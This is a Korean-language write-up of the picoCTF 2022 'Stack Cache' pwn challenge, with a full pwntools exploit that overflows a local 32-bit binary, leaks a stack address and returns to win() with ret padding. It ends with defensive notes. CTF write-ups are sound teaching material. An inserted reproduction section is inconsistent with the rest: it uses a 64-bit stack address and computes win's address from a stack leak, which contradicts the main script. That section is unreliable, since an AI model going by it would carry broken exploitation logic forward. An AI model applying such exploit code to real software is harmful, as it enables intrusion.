---
title: Stack Cache — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-16
type: query
tags: [ctf, pwn, stack-leak, ret2win, rop, buffer-overflow, picoctf]
sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/stack-cache, https://github.com/HHousen/PicoCTF-2022/blob/master/Binary%20Exploitation/stack%20cache/script.py, https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/]
confidence: high
---

# Stack Cache — picoCTF 2022 pwn writeup

> `Stack Cache`는 **스택 오버플로를 이용해 먼저 스택 주소를 누출하고, 그 뒤 `win()`으로 되돌아가 flag를 출력하는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **stack leak + ret2win + ROP padding**입니다.

## 1. 핵심 요약

- 프로그램은 `UnderConstruction`와 `vuln` 흐름을 오갑니다.
- 오버플로 오프셋은 **14**로 알려져 있습니다.
- 먼저 `UnderConstruction`으로 리턴해 **스택 위치**를 누출합니다.
- 누출된 주소를 바탕으로 `printf()`에 넘길 스택 인접 값을 계산합니다.
- 최종적으로 `win()`으로 돌아가 flag를 획득합니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / buffer overflow |
| 핵심 요소 | stack leak, ret2win, ROP padding |
| 오프셋 | 14 |
| 목표 | 누출된 스택 주소를 활용해 flag 출력 |

## 3. 공격 흐름

1. cyclic pattern 등으로 오버플로 위치를 찾습니다.
2. 첫 페이로드로 `UnderConstruction -> vuln` 순서로 리턴합니다.
3. 출력에서 `User information :` 라인을 파싱해 스택 주소를 얻습니다.
4. `stack_location - 0x20` 근처 값을 출력하도록 작은 ROP chain을 만듭니다.
5. 최종 페이로드는 `win()`으로 점프하고, `ret` 가젯을 여러 번 패딩합니다.
6. flag가 출력되면 종료합니다.

## 4. 왜 가능한가

이 문제는 단순한 ret2win처럼 보이지만, 실제로는 **한 번의 리턴으로 스택 주소를 얻고**, 그 정보를 바탕으로 **후속 ROP 체인**을 안정화하는 구조입니다. `ret` 가젯을 여러 번 두는 이유는 스택 정렬이나 오프셋 오차를 완화하기 위해서입니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.
import re           # flag를 정규식으로 추출합니다.

elf = context.binary = ELF('./vuln')  # 로컬 바이너리를 로드합니다.
io = process(elf.path)                # 로컬에서 실행합니다.

offset = 14  # 확인된 오버플로 오프셋입니다.
ret = 0x0804900e  # ret 가젯 예시입니다. 실제 바이너리에서 확인합니다.

# 1) UnderConstruction -> vuln으로 되돌아가 스택 주소를 누출합니다.
payload = flat({
    offset: p32(elf.symbols['UnderConstruction']) + p32(elf.symbols['vuln'])
})
io.sendlineafter(b'>', payload)  # 예상: User information 라인이 출력됩니다.

line = io.recvline_contains(b'User information : ')  # 스택 주소가 들어 있는 라인입니다.
stack_location = int(line.split(b' ')[8], 16)        # 9번째 필드를 주소로 해석합니다.

# 2) 스택 근처 값을 출력하는 작은 ROP 체인을 준비합니다.
rop = ROP(elf)
rop.printf(stack_location - 0x20)  # 예상: 스택 인접 값이 출력됩니다.
rop.exit()                         # 깔끔하게 종료합니다.

# 3) 최종 payload는 win()으로 들어가고 ret로 패딩합니다.
final = flat({
    offset: p32(elf.symbols['win']) + p32(ret) * 50 + rop.chain()
})
io.sendline(final)  # 예상: flag가 출력됩니다.

output = io.recvuntil(b'}')  # flag 종료 문자까지 읽습니다.
flag = re.search(rb'picoCTF\{.*?\}', output).group().decode()
print(flag)  # 예상 출력: picoCTF{...}
```


## 재현 절차

1. 누출되는 스택 값을 먼저 확인합니다.
```bash
# 프로그램 출력에 스택 주소나 힌트가 있는지 확인합니다.
./vuln                   # 예상: cache / leak 관련 문자열이 출력됩니다.
```
2. 누출값으로 ret2win에 필요한 주소를 계산합니다.
```python
# 누출값을 이용해 최종 주소를 계산하는 흐름입니다.
leak = 0x7fffffffe000      # 예시: 스택 누출값입니다.
win  = leak - 0x120       # 예시: 오프셋을 적용합니다.
print(hex(win))           # 예상: win 함수 관련 주소가 출력됩니다.
```
3. 계산한 주소로 flag 출력 경로를 호출합니다.
## 6. 방어 관점 메모

- 한 번의 취약 입력으로 주소 누출과 제어 흐름 변조가 모두 가능하면 매우 위험합니다.
- 스택 주소 노출은 ASLR의 효과를 약화시킵니다.
- 오프셋 계산이 가능한 상황이면 ret2win은 매우 쉽게 재현됩니다.
- 출력 포맷에서 주소를 직접 노출하지 않도록 해야 합니다.

## 7. 비교 포인트

- `ROPfu`는 **classic ROP syscall형**입니다.
- `Function Overwrite`는 **function pointer overwrite형**입니다.
- `RPS`는 **logic bug / substring abuse형**입니다.
- `Stack Cache`는 **stack leak + ret2win형**입니다.

## 8. 참고 자료

- [Hayden Housen — stack cache | PicoCTF-2022 Writeup](https://picoctf2022.haydenhousen.com/binary-exploitation/stack-cache)
- [HHousen/PicoCTF-2022 — stack cache/script.py](https://github.com/HHousen/PicoCTF-2022/blob/master/Binary%20Exploitation/stack%20cache/script.py)
- [maple3142 — picoCTF 2022 WriteUps](https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/)
- [[stack-leak-ret2win-ctf-patterns]]
- [[exploitation]]
